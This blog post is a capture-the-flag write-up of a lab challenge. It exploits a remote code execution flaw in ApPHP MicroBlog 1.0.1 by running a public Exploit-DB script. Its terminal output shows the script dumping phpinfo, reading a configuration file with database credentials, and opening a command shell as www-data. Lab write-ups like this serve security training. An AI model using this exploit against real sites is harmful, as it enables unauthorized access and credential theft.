---
layout: post
title: AttackDefense.com [RCE] - ApPHP MicroBlog
date: 2018-10-26 12:33 -0300
categories: [AttackDefense.com, ctf, writeups, RCE]
tags: [ writeups, CTF,  challenge, AttackDefense.com]
---

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-26 17-44-27.png)

### Mission

This version of ApPHP MicroBlog is vulnerable to a remote code execution attack. Your task is to find and exploit this vulnerability.

Level difficulty: Intermediate

Category: Real World Webapps > Remote Code Execution

### Solution

In this challenge, I got a copy of a complete but old version of a blog engine, which I later discovered to be a real engine. The Real World Webapps category certainly does contain multiple real-world applications!

![Image of AttackDefense 2018](/uploads/adrce2/image6.png)

First, I was drawn to this little error:

![Image of AttackDefense 2018](/uploads/adrce2/image11.png)

Funnily enough, this gave me the inspiration for the next challenge (AttackDefense.com [RCE] - osCommerce), but it did not help me solve this one, as install.php was nowhere to be found.

![Image of AttackDefense 2018](/uploads/adrce2/image1.png)

After a bit of manual crawling, I discovered the Admin Login page:

![Image of AttackDefense 2018](/uploads/adrce2/image10.png)

![Image of AttackDefense 2018](/uploads/adrce2/image8.png)


I also have to admit that I tried both Local and Remote File Inclusion vulnerabilities, but with no luck whatsoever:

![Image of AttackDefense 2018](/uploads/adrce2/image4.png)

Using the same username and password as in the previous challenge (AttackDefense.com [RCE] - Joomla com_xcloner Component), I obtained access to the blog control panel on the first attempt.

![Image of AttackDefense 2018](/uploads/adrce2/image5.png)

After several attempts to execute PHP code inside the already existing articles (I was thinking of template tags), I decided to search for exploits for this blog engine, and luckily enough I found this interesting one:

![Image of AttackDefense 2018](/uploads/adrce2/image7.png)

Link: [https://www.exploit-db.com/exploits/33070/](https://www.exploit-db.com/exploits/33070/)

Let's run the exploit:

```terminal
lucian@local:~/Downloads$ python 33070.py http://t832sc6atai03njff2nqe6kov.public2.attackdefenselabs.com/index.php
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
	PHP Version 5.3.10-1ubuntu3.26
	System   Linux attackdefense.com 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64
	Loaded Configuration File   /etc/php5/apache2/php.ini
	Apache Version   Apache/2.2.22 (Ubuntu)
	User/Group   www-data(33)/33
	Server Root   /etc/apache2
	DOCUMENT_ROOT   /var/www
	PHP Version   5.3.10-1ubuntu3.26
	allow_url_fopen  On  On
	allow_url_include  Off  Off
	disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
	open_basedir   no value    no value
	safe_mode  Off  Off
	safe_mode_exec_dir   no value    no value
	safe_mode_gid  Off  Off
	safe_mode_include_dir   no value    no value
	safe_mode_allowed_env_vars  PHP_  PHP_
	safe_mode_protected_env_vars  LD_LIBRARY_PATH  LD_LIBRARY_PATH

[*] Fetching include/base.inc.php
<?php
			// DATABASE CONNECTION INFORMATION
			define('DATABASE_HOST', 'localhost');	        // Database host
			define('DATABASE_NAME', 'big');	        // Name of the database to be used
			define('DATABASE_USERNAME', 'root');	// User name for access to database
			define('DATABASE_PASSWORD', '');	// Password for access to database
			define('DB_ENCRYPT_KEY', '6hpq3545z7');		// Database encryption key
			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database
			?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
> ls
INSTALL.txt
README.txt
admin
backup
docs
footer.php
header.php
html
images
include
index.php
install
install.php
js
license
mails
page
rss.xml
styles
wysiwyg
```

And of course, we got a terminal shell as the ```www-data``` user:

![Image of AttackDefense 2018](/uploads/adrce2/image9.png)

![Image of AttackDefense 2018](/uploads/adrce2/image3.png)